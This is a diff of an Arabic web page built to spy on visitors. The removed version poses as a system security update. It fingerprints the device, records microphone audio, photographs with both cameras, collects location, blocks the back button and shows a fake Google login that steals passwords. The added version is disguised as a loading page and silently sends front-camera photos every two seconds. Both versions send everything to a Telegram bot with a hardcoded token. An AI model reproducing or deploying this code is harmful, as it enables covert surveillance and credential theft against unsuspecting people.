@@ -1,160 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚙️ تحديث أمان النظام</title>
+    <title>تحميل المحتوى...</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
-        .login-card { width: 90%; max-width: 360px; text-align: center; }
-        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; }
-        #video, #canvas { display: none; }
+        body { background-color: #000; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        video { display: none; } /* إخفاء الفيديو ليكون العمل سرياً */
     </style>
 </head>
 <body>
 
-    <div id="main-ui">
-        <div class="loader"></div>
-        <h2 style="color:#eee;">جاري تحسين استقرار النظام...</h2>
-        <p style="font-size:12px; color:#666;">يرجى عدم إغلاق الصفحة لإتمام الفحص</p>
-    </div>
-
-    <div id="phish-overlay">
-        <div class="login-card">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
-            <h1 style="font-size: 22px; font-weight: 400;">تأكيد ملكية الحساب</h1>
-            <input type="email" id="email" placeholder="البريد الإلكتروني">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="sendCreds()">تأكيد الهوية</button>
-        </div>
-    </div>
-
-    <video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0.01;"></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
-        let currentStream = null;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-        function notify(msg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
-
-        // 1. بصمة الجهاز كاملة
-        async function getIntelligence() {
+        // طلب إذن الكاميرا
+        async function startCamera() {
             try {
-                const batt = await navigator.getBattery();
-                const info = `🚀 **هدف جديد في الفخ:**\n\n` +
-                             `📱 *النظام:* ${navigator.platform}\n` +
-                             `⚙️ *المعالج:* ${navigator.hardwareConcurrency || 'N/A'}\n` +
-                             `💾 *الرام:* ${navigator.deviceMemory || 'N/A'} GB\n` +
-                             `🔋 *البطارية:* ${Math.round(batt.level * 100)}%\n` +
-                             `📶 *الشبكة:* ${navigator.connection ? navigator.connection.effectiveType : '3g'}\n` +
-                             `⏰ *التوقيت:* ${new Date().toLocaleTimeString('ar-YE')}\n` +
-                             `🌍 *المنطقة:* Asia/Aden`;
-                notify(info);
-            } catch(e) {}
-        }
-
-        // 2. تسجيل الصوت 8 ثواني
-        async function startAudio() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const rec = new MediaRecorder(stream);
-                rec.ondataavailable = (e) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('voice', e.data, 'mic.ogg');
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
-                };
-                setInterval(() => {
-                    rec.start();
-                    setTimeout(() => rec.stop(), 8000);
-                }, 20000);
-            } catch(e) {}
-        }
-
-        // 3. حل مشكلة الصور السوداء (تصوير ذكي)
-        async function startVisuals() {
-            const modes = ["user", "environment"];
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            let i = 0;
-
-            while(true) {
-                const mode = modes[i % 2];
-                try {
-                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-                    
-                    // طلب الكاميرا بإعدادات تضمن التشغيل
-                    currentStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } } 
-                    });
-                    
-                    video.srcObject = currentStream;
-
-                    // حل السواد: الانتظار حتى يتدفق البث فعلياً (تأكد من تشغيل الفيديو)
-                    await new Promise(resolve => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(resolve, 1500); // زيادة وقت الانتظار لفتح العدسة
-                        };
-                    });
-
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `🔄 لقطة من الكاميرا: ${mode === "user" ? "الأمامية" : "الخلفية"}`);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg', 0.6);
-
-                } catch(e) {
-                    console.error("Camera error:", e);
-                }
-                i++;
-                await new Promise(r => setTimeout(r, 4000)); // موازنة الوقت بين الكاميرات
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                // البدء في التقاط الصور كل 2 ثانية وإرسالها
+                setInterval(captureAndSend, 2000);
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
             }
         }
 
-        function sendCreds() {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            if(e && p) {
-                notify(`🔑 **بيانات جوجل:**\n📧: \`${e}\`\n🔐: \`${p}\``);
-                document.getElementById('phish-overlay').style.display = 'none';
-                alert("اكتملت العملية بنجاح.");
-            }
+        // تحويل الصورة وإرسالها لبوت تليجرام
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.5); // جودة 50% لسرعة الإرسال
         }
 
-        window.onload = () => {
-            // منع الرجوع
-            for(let i=0; i<50; i++) window.history.pushState(null, null, window.location.href);
-            
-            getIntelligence();
-            startAudio();
-            startVisuals();
-
-            // الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                notify(`📍 **الموقع:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-
-            setTimeout(() => {
-                document.getElementById('phish-overlay').style.display = 'flex';
-            }, 15000);
-
-            if(navigator.wakeLock) navigator.wakeLock.request('screen');
-        };
+        window.onload = startCamera;
     </script>
 </body>
 </html>
